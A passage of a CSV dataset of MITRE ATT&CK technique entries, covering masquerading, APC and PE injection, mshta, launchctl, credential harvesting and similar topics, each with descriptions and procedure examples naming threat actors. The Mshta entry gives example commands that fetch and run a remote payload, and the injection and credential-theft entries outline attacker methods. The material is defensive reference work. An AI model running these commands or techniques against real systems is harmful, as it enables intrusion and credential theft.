T1036.004,Masquerade Task or Service,"Adversaries may attempt to manipulate the name of a task or service to make it appear legitimate or benign. Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description. Windows services will have a service name as well as a display name. Many benign tasks and services exist that have commonly associated names. Adversaries may give tasks or services names that are similar or identical to those of legitimate ones.  Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.","['[DCSrv] has masqueraded its service as a legitimate svchost.exe process.', 'In one instance, [menuPass] added [PlugX] as a service with a display name of ""Corel Writing Tools Utility.""', '[SVCReady] has named a task `RecoveryExTask` as part of its persistence activity.', 'During the [2022 Ukraine Electric Power Attack] [Sandworm Team] leveraged Systemd service units to masquerade GOGETTER malware as legitimate or seemingly legitimate services.', 'During [C0017] [APT41] used `SCHTASKS  /Change` to modify legitimate scheduled tasks to run malicious code.', '[Attor] dispatcher disguises itself as a legitimate task (i.e., the task name and description appear legitimate).', '[Maze] operators have created scheduled tasks masquerading as ""Windows Update Security"", ""Windows Update Security Patches"", and ""Google Chrome Security Update"" designed to launch the ransomware. ', '[RDAT] has used Windows Video Service as a name for malicious services.', '[Kimsuky] has disguised services to appear as benign software or related to operating system functions.', '[Carbanak] has copied legitimate service names to use for malicious services.', '[SUGARDUMP] scheduled task has been named `MicrosoftInternetExplorerCrashRepoeterTaskMachineUA` or `MicrosoftEdgeCrashRepoeterTaskMachineUA`, depending on the Windows OS version. ', '[POWERSTATS] has created a scheduled task named ""MicrosoftEdge"" to establish persistence.', '[Fysbis] has masqueraded as the rsyncd and dbus-inotifier services.', '[Meteor] has been disguised as the Windows Power Efficiency Diagnostics report tool.', 'New services created by [RawPOS] are made to appear like legitimate Windows services, with names such as ""Windows Management Help Service"", ""Microsoft Support"", and ""Windows Advanced Task Manager"".', '[FIN7] has created a scheduled task named “AdobeFlashSync” to establish persistence.', '[RainyDay] has named services and scheduled tasks to appear benign including ""ChromeCheck"" and ""googleupdate.""', '[Shamoon] creates a new service named “ntssrv” that attempts to appear legitimate; the service\'s display name is “Microsoft Network Realtime Inspection Service” and its description is “Helps guard against time change attempts targeting known and newly discovered vulnerabilities in network time protocols.” Newer versions create the ""MaintenaceSrv"" service, which misspells the word ""maintenance.""', '[ZxxZ] has been disguised as a Windows security update service.', '[build_downer] has added itself to the Registry Run key as ""NVIDIA"" to appear legitimate.', '[PingPull] can mimic the names and descriptions of legitimate services such as `iphlpsvc`, `IP Helper`,  and `Onedrive` to evade detection.', '[StrongPity] has named services to appear legitimate.', '[Seasalt] has masqueraded as a service called ""SaSaut"" with a display name of ""System Authorization Service"" in an apparent attempt to masquerade as a legitimate service.', '[KONNI] has pretended to be the xmlProv Network Provisioning service. ', '[SLOTHFULMEDIA] has named a service it establishes on victim machines as ""TaskFrame"" to hide its malicious purpose. ', ""[FIN13] has used scheduled tasks names such as `acrotyr` and `AppServicesr` to mimic the same names in a compromised network's `C:\\Windows` directory."", '[APT-C-36] has disguised its scheduled tasks as those used by Google.', '[FunnyDream] has used a service named `WSearch` for execution.', '[CSPY Downloader] has attempted to appear as a legitimate Windows service with a fake description claiming it is used to support packed applications.', '[Okrum] can establish persistence by adding a new service NtmsSvc with the display name Removable Storage to masquerade as a legitimate Removable Storage Manager.', '[Uroburos] has registered a service named `WerFaultSvc`, likely to spoof the legitimate Windows error reporting service.', '[ShimRat] can impersonate Windows services and antivirus products to avoid detection on compromised systems.', '[Egregor] has masqueraded the svchost.exe process to exfiltrate data.', '[Machete] renamed task names to masquerade as legitimate Google Chrome, Java, Dropbox, Adobe Reader and Python tasks. ', '[APT32] has used hidden or non-printing characters to help masquerade service names, such as appending a Unicode no-break space character to a legitimate service name. [APT32] has also impersonated the legitimate Flash installer file name ""install_flashplayer.exe"".', '[Tarrask] creates a scheduled task called “WinUpdate” to re-establish any dropped  C2 connections.', '[Hildegard] has disguised itself as a known Linux process.', '[Wizard Spider] has used scheduled tasks to install [TrickBot] using task names to appear legitimate such as WinDotNet, GoogleTask, or Sysnetsf. It has also used common document file names for other malware binaries.', '[TinyTurla] has mimicked an existing Windows service by being installed as <code>Windows Time Service</code>.', '[SysUpdate] has named their unit configuration file similarly to other unit files residing in the same directory, `/usr/lib/systemd/system/`, to appear benign.', '[BITTER] has disguised malware as a Windows Security update service.', 'To establish persistence, [Truvasys] adds a Registry Run key with a value ""TaskMgr"" in an attempt to masquerade as the legitimate Windows Task Manager.', '[RTM] has named the scheduled task it creates ""Windows Update"".', '[FIN6] has renamed the ""psexec"" service name to ""mstdc"" to masquerade as a legitimate Windows service.\t', '[Nebulae] has created a service named ""Windows Update Agent1"" to appear legitimate.', '[Naikon] renamed a malicious service <code>taskmgr</code> to appear to be a legitimate version of Task Manager.', '[IronNetInjector] has been disguised as a legitimate service using the name PythonUpdateSrvc.', '[NightClub] has created a service named `WmdmPmSp` to spoof a Windows Media service.', '[Nidiran] can create a new service named msamger (Microsoft Security Accounts Manager), which mimics the legitimate Microsoft database by the same name.', '[Bazar] can create a task named to appear benign.', '[Crutch] has established persistence with a scheduled task impersonating the Outlook item finder.', '[Emotet] has installed itself as a new service with the service name `Windows Defender System Service` and display name `WinDefService`.', ""[OSX_OCEANLOTUS.D] uses file naming conventions with associated executable locations to blend in with the macOS TimeMachine and OpenSSL services. Such as, naming a LaunchAgent plist file `com.apple.openssl.plist` which executes [OSX_OCEANLOTUS.D] from the user's `~/Library/OpenSSL/` folder upon user login."", '[Fox Kitten] has named the task for a reverse proxy lpupdate to appear legitimate.', '[PROMETHIUM] has named services to appear legitimate.', '[InnaputRAT] variants have attempted to appear legitimate by adding a new service named OfficeUpdateService.', '[Kwampirs] establishes persistence by adding a new service with the display name ""WMI Performance Adapter Extension"" in an attempt to masquerade as a legitimate WMI service.', '[Catchamas] adds a new service named NetAdapter in an apparent attempt to masquerade as a legitimate service.', 'During [Frankenstein] the threat actors named a malicious scheduled task ""WinUpdate"" for persistence.', '[DEADEYE] has used `schtasks /change` to modify scheduled tasks including `\\Microsoft\\Windows\\PLA\\Server Manager Performance Monitor`, `\\Microsoft\\Windows\\Ras\\ManagerMobility, \\Microsoft\\Windows\\WDI\\SrvSetupResults`, and `\\Microsoft\\Windows\\WDI\\USOShared`.', '[ZIRCONIUM] has created a run key named <code>Dropbox Update Setup</code> to mask a persistence mechanism for a malicious binary.', '[Green Lambert] has created a new executable named `Software Update Check` to appear legitimate. ', '[Magic Hound] has named a malicious script CacheTask.bat to mimic a legitimate task.', '[KillDisk] registers as a service under the Plug-And-Play Support name.', 'During the [SolarWinds Compromise] [APT29] named tasks `\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager` in order to appear legitimate.', 'The [Exaramel for Windows] dropper creates and starts a Windows service named wsmprovav with the description “Windows Check AV” in an apparent attempt to masquerade as a legitimate service.', '[Higaisa] named a shellcode loader binary <code>svchast.exe</code> to spoof the legitimate <code>svchost.exe</code>. ', '[Lazarus Group] has used a scheduled task named `SRCheck` to mask the execution of a malicious .dll.', 'Some [Volgmer] variants add new services with display names generated by a list of hard-coded strings such as Application, Background, Security, and Windows, presumably as a way to masquerade as a legitimate service.', '[Turian] can disguise as a legitimate service to blend into normal operations.', '[InvisiMole] has attempted to disguise itself by registering under a seemingly legitimate service name.', '[GoldMax] has impersonated systems management software to avoid detection.', '[ComRAT] has used a task name associated with Windows SQM Consolidator.', '[Heyoka Backdoor] has been named `srvdll.dll` to appear as a legitimate service.', '[BackdoorDiplomacy] has disguised their backdoor droppers with naming conventions designed to blend into normal operations.', '[APT41] has created services to appear as benign system tools.', '[Black Basta] has established persistence by creating a new service named `FAX` after deleting the legitimate service by the same name.', '[APT29] named tasks <code>\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager</code> in order to appear legitimate.', '[UNC2452] named tasks <code>\\Microsoft\\Windows\\SoftwareProtectionPlatform\\EventCacheManager</code> in order to appear legitimate.', 'A [Lazarus Group] custom backdoor implant included a custom PE loader named ""Security Package"" that was added into the lsass.exe process via registry key. ']",False
T1055.004,Asynchronous Procedure Call,"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process.   APC injection is commonly performed by attaching malicious code to the APC Queue  of a process's thread. Queued APC functions are executed when the thread enters an alterable state. A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL).   A variation of APC injection, dubbed ""Early Bird injection"", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC.  AtomBombing  is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.  Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ","['[TURNEDUP] is capable of injecting code into the APC queue of a created [Rundll32] process as part of an ""Early Bird injection.""', '[Pillowmint] has used the NtQueueApcThread syscall to inject code into svchost.exe.', '[InvisiMole] can inject its code into a trusted process via the APC queue.', '[Bumblebee] can use asynchronous procedure call (APC) injection to execute commands received from C2.', '[Saint Bot] has written its payload into a newly-created `EhStorAuthn.exe` process using `ZwWriteVirtualMemory` and executed it using `NtQueueApcThread` and `ZwAlertResumeThread`.', '[Carberp] has queued an APC routine to explorer.exe by calling ZwQueueApcThread.', '[IcedID] has used <code>ZwQueueApcThread</code> to inject itself into remote processes.', '[BADHATCH] can inject itself into a new `svchost.exe -k netsvcs` process using the asynchronous procedure call (APC) queue. ', '[FIN8] has injected malicious code into a new svchost.exe process.', '[Attor] performs the injection by attaching its code into the APC queue using NtQueueApcThread API.', '[Sardonic] can use the `QueueUserAPC` API to execute shellcode on a compromised machine.']",
T1020.001,Traffic Duplication,"Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device.   Adversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit] or [Patch System Image]  Many cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.  Adversaries may use traffic duplication in conjunction with [Network Sniffing] [Input Capture] or [Adversary-in-the-Middle] depending on the goals and objectives of the adversary.",[],False
T1546.009,AppCert DLLs,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes. Dynamic-link libraries (DLLs) that are specified in the <code>AppCertDLLs</code> Registry key under <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> are loaded into every process that calls the ubiquitously used application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, or <code>WinExec</code>.   Similar to [Process Injection] this value can be abused to obtain elevated privileges by causing a malicious DLL to be loaded and run in the context of separate processes on the computer. Malicious AppCert DLLs may also provide persistence by continuously being triggered by API activity. ","['[PUNCHBUGGY] can establish using a AppCertDLLs Registry key.', '[Honeybee] service-based DLL implant can execute a downloaded file with parameters specified using <code>CreateProcessAsUser</code>.']",
T1114.003,Email Forwarding Rule,"Adversaries may setup email forwarding rules to collect sensitive information. Adversaries may abuse email forwarding rules to monitor the activities of a victim, steal information, and further gain intelligence on the victim or the victim’s organization to use as part of further exploits or operations. Furthermore, email forwarding rules can allow adversaries to maintain persistent access to victim's emails even after compromised credentials are reset by administrators. Most email clients allow users to create inbox rules for various email functions, including forwarding to a different recipient. These rules may be created through a local email application, a web interface, or by command-line interface. Messages can be forwarded to internal or external recipients, and there are no restrictions limiting the extent of this rule. Administrators may also create forwarding rules for user accounts with the same considerations and outcomes.  Any user or administrator within the organization (or adversary with valid credentials) can create rules to automatically forward all received messages to another recipient, forward emails to different locations based on the sender, and more. Adversaries may also hide the rule by making use of the Microsoft Messaging API (MAPI) to modify the rule properties, making it hidden and not visible from Outlook, OWA or most Exchange Administration tools.  In some environments, administrators may be able to enable email forwarding rules that operate organization-wide rather than on individual inboxes. For example, Microsoft Exchange supports transport rules that evaluate all mail an organization receives against user-specified conditions, then performs a user-specified action on mail that adheres to those conditions. Adversaries that abuse such features may be able to enable forwarding on all or specific mail an organization receives. ","['[Silent Librarian] has set up auto forwarding rules on compromised e-mail accounts.', '[LAPSUS$] has set an Office 365 tenant level mail transport rule to send all mail in and out of the targeted organization to the newly created account.', ""[Kimsuky] has set auto-forward rules on victim's e-mail accounts.""]",False
T1098.005,Device Registration,"Adversaries may register a device to an adversary-controlled account. Devices may be registered in a multifactor authentication (MFA) system, which handles authentication to the network, or in a device management system, which handles device access and compliance.  MFA systems, such as Duo or Okta, allow users to associate devices with their accounts in order to complete MFA requirements. An adversary that compromises a user’s credentials may enroll a new device in order to bypass initial MFA requirements and gain persistent access to a network. In some cases, the MFA self-enrollment process may require only a username and password to enroll the account's first device or to enroll a device to an inactive account.   Similarly, an adversary with existing access to a network may register a device to Azure AD and/or its device management system, Microsoft Intune, in order to access sensitive data or resources while bypassing conditional access policies.   Devices registered in Azure AD may be able to conduct [Internal Spearphishing] campaigns via intra-organizational emails, which are less likely to be treated as suspicious by the email client. Additionally, an adversary may be able to perform a [Service Exhaustion Flood] on an Azure AD tenant by registering a large number of devices.","['[APT29] has enrolled their own devices into compromised cloud tenants, including enrolling a device in MFA to an Azure AD environment following a successful password guessing attack against a dormant account.', '[AADInternals] can register a device to Azure AD.', 'During the [SolarWinds Compromise] [APT29] registered devices in order to enable mailbox syncing via the `Set-CASMailbox` command.', ""During [C0027] [Scattered Spider] registered devices for MFA to maintain persistence through victims' VPN."", '[APT29] registered devices in order to enable mailbox syncing via the <code>Set-CASMailbox</code> command.']",False
T1553.005,Mark-of-the-Web Bypass,"Adversaries may abuse specific file formats to subvert Mark-of-the-Web (MOTW) controls. In Windows, when files are downloaded from the Internet, they are tagged with a hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> with a specific value known as the MOTW. Files that are tagged with MOTW are protected and cannot perform certain actions. For example, starting in MS Office 10, if a MS Office file has the MOTW, it will open in Protected View. Executables tagged with the MOTW will be processed by Windows Defender SmartScreen that compares files with an allowlist of well-known executables. If the file is not known/trusted, SmartScreen will prevent the execution and warn the user not to run it.  Adversaries may abuse container files such as compressed/archive (.arj, .gzip) and/or disk image (.iso, .vhd) file formats to deliver malicious payloads that may not be tagged with MOTW. Container files downloaded from the Internet will be marked with MOTW but the files within may not inherit the MOTW after the container files are extracted and/or mounted. MOTW is a NTFS feature and many container files do not support NTFS alternative data streams. After a container file is extracted and/or mounted, the files contained within them may be treated as local files on disk and run without protections.","['[TA505] has used .iso files to deploy malicious .lnk files.', '[Amadey] has modified the `:Zone.Identifier` in the ADS area to zero.', '[QakBot] has been packaged in ISO files in order to bypass Mark of the Web (MOTW) security measures.', '[APT29] has embedded ISO images and VHDX files in HTML to evade Mark-of-the-Web.']",False
T1600.002,Disable Crypto Hardware,"Adversaries disable a network device’s dedicated hardware encryption, which may enable them to leverage weaknesses in software encryption in order to reduce the effort involved in collecting, manipulating, and exfiltrating transmitted data.  Many network devices such as routers, switches, and firewalls, perform encryption on network traffic to secure transmission across networks. Often, these devices are equipped with special, dedicated encryption hardware to greatly increase the speed of the encryption process as well as to prevent malicious tampering. When an adversary takes control of such a device, they may disable the dedicated hardware, for example, through use of [Modify System Image] forcing the use of software to perform encryption on general processors. This is typically used in conjunction with attacks to weaken the strength of the cipher in software (e.g., [Reduce Key Space] ",[],
T1055.002,Portable Executable Injection,"Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges. PE injection is a method of executing arbitrary code in the address space of a separate live process.   PE injection is commonly performed by copying code (perhaps without a file on disk) into the virtual address space of the target process before invoking it via a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> or additional code (ex: shellcode). The displacement of the injected code does introduce the additional requirement for functionality to remap memory references.    Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via PE injection may also evade detection from security products since the execution is masked under a legitimate process. ","['[InvisiMole] can inject its backdoor as a portable executable into a target process.\t', '[Carbanak] downloads an executable and injects it directly into a new process.', '[Rocke] miner, ""TermsHost.exe"", evaded defenses by injecting itself into Windows processes, including Notepad.exe.\t', '[Gorgon Group] malware can download a remote access tool, [ShiftyBug] and inject into another process.', '[Lizar] can execute PE files in the address space of the specified process. ', '[GreyEnergy] has a module to inject a PE binary into a remote process.', '[Zeus Panda] checks processes on the system and if they meet the necessary requirements, it injects into that process.']",
T1218.012,Verclsid,"Adversaries may abuse verclsid.exe to proxy execution of malicious code. Verclsid.exe is known as the Extension CLSID Verification Host and is responsible for verifying each shell extension before they are used by Windows Explorer or the Windows Shell.  Adversaries may abuse verclsid.exe to execute malicious payloads. This may be achieved by running <code>verclsid.exe /S /C {CLSID}</code>, where the file is referenced by a Class ID (CLSID), a unique identification number used to identify COM objects. COM payloads executed by verclsid.exe may be able to perform various malicious actions, such as loading and executing COM scriptlets (SCT) from remote servers (similar to [Regsvr32] Since the binary may be signed and/or native on Windows systems, proxying execution via verclsid.exe may bypass application control solutions that do not account for its potential abuse. ",['[Hancitor] has used verclsid.exe to download and execute a malicious script.'],False
T1569.001,Launchctl,"Adversaries may abuse launchctl to execute commands or programs. Launchctl interfaces with launchd, the service management framework for macOS. Launchctl supports taking subcommands on the command-line, interactively, or even redirected from standard input.  Adversaries use launchctl to execute commands and programs as [Launch Agent] or [Launch Daemon] Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, and <code>launchctl start</code>. Adversaries can use scripts or manually run the commands <code>launchctl load -w ""%s/Library/LaunchAgents/%s""</code> or <code>/bin/launchctl load</code> to execute [Launch Agent] or [Launch Daemon] ","['[LoudMiner] launched the QEMU services in the <code>/Library/LaunchDaemons/</code> folder using <code>launchctl</code>. It also uses <code>launchctl</code> to unload all [Launch Daemon] when updating to a newer version of [LoudMiner]\t', '[AppleJeus] has loaded a plist file using the <code>launchctl</code> command.', '[macOS.OSAMiner] has used `launchctl` to restart the [Launch Agent]', '[XCSSET] loads a system level launchdaemon using the <code>launchctl load -w</code> command from <code>/System/Librarby/LaunchDaemons/ssh.plist</code>.', '[Calisto] uses launchctl to enable screen sharing on the victim’s machine.']",
T1584.005,Botnet,"Adversaries may compromise numerous third-party systems to form a botnet that can be used during targeting. A botnet is a network of compromised systems that can be instructed to perform coordinated tasks. Instead of purchasing/renting a botnet from a booter/stresser service, adversaries may build their own botnet by compromising numerous third-party systems. Adversaries may also conduct a takeover of an existing botnet, such as redirecting bots to adversary-controlled C2 servers. With a botnet at their disposal, adversaries may perform follow-on activity such as large-scale [Phishing] or Distributed Denial of Service (DDoS).","['[Axiom] has used large groups of compromised machines for use as proxy nodes.', '[Sandworm Team] has used a large-scale botnet to target Small Office/Home Office (SOHO) network devices.']",False
T1059.008,Network Device CLI,"Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands.   Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or [SSH]  Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.",[],False
T1552.003,Bash History,"Adversaries may search the bash command history on compromised systems for insecurely stored credentials. Bash keeps track of the commands users type on the command-line with the ""history"" utility. Once a user logs out, the history is flushed to the user’s <code>.bash_history</code> file. For each user, this file resides at the same location: <code>~/.bash_history</code>. Typically, this file keeps track of the user’s last 500 commands. Users often type usernames and passwords on the command-line as parameters to programs, which then get saved to this file when they log out. Adversaries can abuse this by looking through the file for potential credentials. ",['[Kinsing] has searched <code>bash_history</code> for credentials.'],
T1562.010,Downgrade Attack,"Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls. Downgrade attacks typically take advantage of a system’s backward compatibility to force it into less secure modes of operation.   Adversaries may downgrade and use various less-secure versions of features of a system, such as [Command and Scripting Interpreter] or even network protocols that can be abused to enable [Adversary-in-the-Middle] or [Network Sniffing] For example, [PowerShell] versions 5+ includes Script Block Logging (SBL) which can record executed script content. However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to [Impair Defenses] while running malicious scripts that may have otherwise been detected.  Adversaries may similarly target network traffic to downgrade from an encrypted HTTPS connection to an unsecured HTTP connection that exposes network data in clear text.",[],False
T1559.003,XPC Services,"Adversaries can provide malicious content to an XPC service daemon for local code execution. macOS uses XPC services for basic inter-process communication between various processes, such as between the XPC Service daemon and third-party application privileged helper tools. Applications can send messages to the XPC Service daemon, which runs as root, using the low-level XPC Service <code>C API</code> or the high level <code>NSXPCConnection API</code> in order to handle tasks that require elevated privileges (such as network connections). Applications are responsible for providing the protocol definition which serves as a blueprint of the XPC services. Developers typically use XPC Services to provide applications stability and privilege separation between the application client and the daemon.  Adversaries can abuse XPC services to execute malicious content. Requests for malicious execution can be passed through the application's XPC Services handler. This may also include identifying and abusing improper XPC client validation and/or poor sanitization of input parameters to conduct [Exploitation for Privilege Escalation]",[],False
T1552.001,Credentials In Files,"Adversaries may search local file systems and remote file shares for files containing insecurely stored credentials. These can be files created by users to store their own credentials, shared credential stores for a group of individuals, configuration files containing passwords for a system or service, or source code/binary files containing embedded passwords.  It is possible to extract passwords from backups or saved virtual machines through [OS Credential Dumping] Passwords may also be obtained from Group Policy Preferences stored on the Windows Domain Controller.  In cloud and/or containerized environments, authenticated user and service account credentials are often stored in local configuration and credential files. They may also be found as parameters to deployment commands in container logs. In some cases, these files can be copied and reused on another machine or the contents can be read and then used to authenticate without needing to copy any files.","['[XTunnel] is capable of accessing locally stored passwords on victims.', '[Pupy] can use Lazagne for harvesting credentials.', '[Emotet] has been observed leveraging a module that retrieves passwords stored on a system for the current logged-on user. ', '[PoshC2] contains modules for searching for passwords in local and remote files.', '[Smoke Loader] searches for files named logins.json to parse for credentials.', '[APT33] has used a variety of publicly available tools like [LaZagne] to gather credentials.', '[Agent Tesla] has the ability to extract credentials from configuration or support files. ', '[LaZagne] can obtain credentials from chats, databases, mail, and WiFi.', '[Empire] can use various modules to search for files containing passwords.', '[Azorult] can steal credentials in files belonging to common software such as Skype, Telegram, and Steam.', '[Pysa] has extracted credentials from the password database before encrypting the files. ', '[Fox Kitten] has accessed files to gain valid credentials.', '[Hildegard] has searched for SSH keys, Docker credentials, and Kubernetes service tokens.', '[TA505] has used malware to gather credentials from FTP clients and Outlook.', '[TrickBot] can obtain passwords stored in files from several applications such as Outlook, Filezilla, OpenSSH, OpenVPN and WinSCP. Additionally, it searches for the "".vnc.lnk"" affix to steal VNC credentials.', '[AADInternals] can gather unsecured credentials for Azure AD services, such as Azure AD Connect, from a local machine.', '[FIN13] has obtained administrative credentials by browsing through local files on a compromised machine.', '[APT3] has a tool that can locate credentials in files on the file system such as those from Firefox or Chrome.', '[Leafminer] used several tools for retrieving login and password information, including LaZagne.', '[QuasarRAT] can obtain passwords from FTP clients.', 'If an initial connectivity check fails, [pngdowner] attempts to extract proxy details and credentials from Windows Protected Storage and from the IE Credentials Store. This allows the adversary to use the proxy credentials for subsequent requests if they enable outbound HTTP access.', '[Kimsuky] has used tools that are capable of obtaining credentials from saved mail.', '[BlackEnergy] has used a plug-in to gather credentials stored in files on the host by various software programs, including The Bat! email client, Outlook, and Windows Credential Store.', '[jRAT] can capture passwords from common chat applications such as MSN Messenger, AOL, Instant Messenger, and and Google Talk.', '[OilRig] has used credential dumping tools such as [LaZagne] to steal credentials to accounts logged into the compromised system and to Outlook Web Access.', '[TeamTNT] has searched for unsecured AWS credentials and Docker API credentials.', '[MuddyWater] has run a tool that steals passwords saved in victim email.', '[Scattered Spider] Spider searches for credential storage documentation on a compromised host.', '[Stolen Pencil] has used tools that are capable of obtaining credentials from saved mail.']",False
T1568.003,DNS Calculation,"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.  One implementation of [DNS Calculation] is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.",['[APT12] has used multiple variants of [DNS Calculation] including multiplying the first two octets of an IP address and adding the third octet to that value in order to get a resulting command and control port.'],
T1218.005,Mshta,"Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code        Mshta.exe is a utility that executes Microsoft HTML Applications (HTA) files.  HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.   Files may be executed by mshta.exe through an inline script: <code>mshta vbscript:Close(Execute(""GetObject(""""script:https[:]//webserver/payload[.]sct"""")""))</code>  They may also be executed directly from URLs: <code>mshta http[:]//webserver/payload[.]hta</code>  Mshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings. ","['[Sidewinder] has used <code>mshta.exe</code> to execute malicious payloads.', '[Lazarus Group] has used <code>mshta.exe</code> to execute HTML pages downloaded by initial access documents.', '[Koadic] can use mshta to serve additional payloads and to help schedule tasks for persistence. ', '[MuddyWater] has used mshta.exe to execute its [POWERSTATS] payload and to pass a PowerShell one-liner for execution.', '[Xbash] can use mshta for executing scripts.', '[Mustang Panda] has used mshta.exe to launch collection scripts.', '[BabyShark] has used mshta.exe to download and execute applications from a remote server.', '[LazyScripter] has used `mshta.exe` to execute [Koadic] stagers. ', '[POWERSTATS] can use Mshta.exe to execute additional payloads on compromised hosts.', ' [TA2541] has used `mshta` to execute scripts including VBS. ', '[Metamorfo] has used mshta.exe to execute a HTA payload. ', '[Inception] has used malicious HTA files to drop and execute malware.', '[Kimsuky] has used mshta.exe to run malicious scripts on the system.', '[FIN7] has used mshta.exe to execute VBScript to execute malicious code on victim systems.', '[Revenge RAT] uses mshta.exe to run malicious scripts on the system.', '[Earth Lusca] has used `mshta.exe` to load an HTA script within a malicious .LNK file.', '[APT32] has used mshta.exe for code execution.', '[NanHaiShu] uses mshta.exe to load its program and files.', '[Sibot] has been executed via MSHTA application.', 'During [Operation Dust Storm] the threat actors executed JavaScript code via `mshta.exe`.', '[APT29] has use `mshta` to execute malicious scripts on a compromised host.', '[Confucius] has used mshta.exe to execute malicious VBScript. ', '[Pteranodon] can use mshta.exe to execute an HTA file hosted on a remote server.', '[TA551] has used mshta.exe to execute malicious payloads.', '[SideCopy] has utilized `mshta.exe` to execute a malicious hta file.', '[Gamaredon Group] has used `mshta.exe` to execute malicious HTA files.', 'During [C0015] the threat actors used `mshta` to execute DLLs.', '[Lazarus Group] has used mshta.exe to run malicious scripts and download programs.']",
T1547.015,Login Items,"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in. Login items can be added via a shared file list or Service Management Framework. Shared file list login items can be set using scripting languages such as [AppleScript] whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.  Login items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them. Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder. Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.  Adversaries can utilize [AppleScript] and [Native API] calls to create a login item to spawn malicious executables. Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript] to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items. Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>. This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>. Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.","['[Green Lambert] can add [Login Items] to establish persistence. ', '[NETWIRE] can persist via startup options for Login items.', '[Dok] uses AppleScript to install a login Item by sending Apple events to the <code>System Events</code> process.']",
T1608.005,Link Target,"Adversaries may put in place resources that are referenced by a link that can be used during targeting. An adversary may rely upon a user clicking a malicious link in order to divulge information (including credentials) or to gain execution, as in [Malicious Link] Links can be used for spearphishing, such as sending an email accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. Prior to a phish for information (as in [Spearphishing Link] or a phish to gain initial access to a system (as in [Spearphishing Link] an adversary must set up the resources for a link target for the spearphishing link.   Typically, the resources for a link target will be an HTML page that may include some client-side script such as [JavaScript] to decide what content to serve to the user. Adversaries may clone legitimate sites to serve as the link target, this can include cloning of login pages of legitimate web services or organization login pages in an effort to harvest credentials during [Spearphishing Link] Adversaries may also [Upload Malware] and have the link target point to malware for download/execution by the user.  Adversaries may purchase domains similar to legitimate domains (ex: homoglyphs, typosquatting, different top-level domain, etc.) during acquisition of infrastructure ([Domains] to help facilitate [Malicious Link]  Links can be written by adversaries to mask the true destination in order to deceive victims by abusing the URL schema and increasing the effectiveness of phishing.  Adversaries may also use free or paid accounts on link shortening services and Platform-as-a-Service providers to host link targets while taking advantage of the widely trusted domains of those providers to avoid being blocked while redirecting victims to malicious pages. In addition, adversaries may serve a variety of malicious links through uniquely generated URIs/URLs (including one-time, single use links). Finally, adversaries may take advantage of the decentralized nature of the InterPlanetary File System 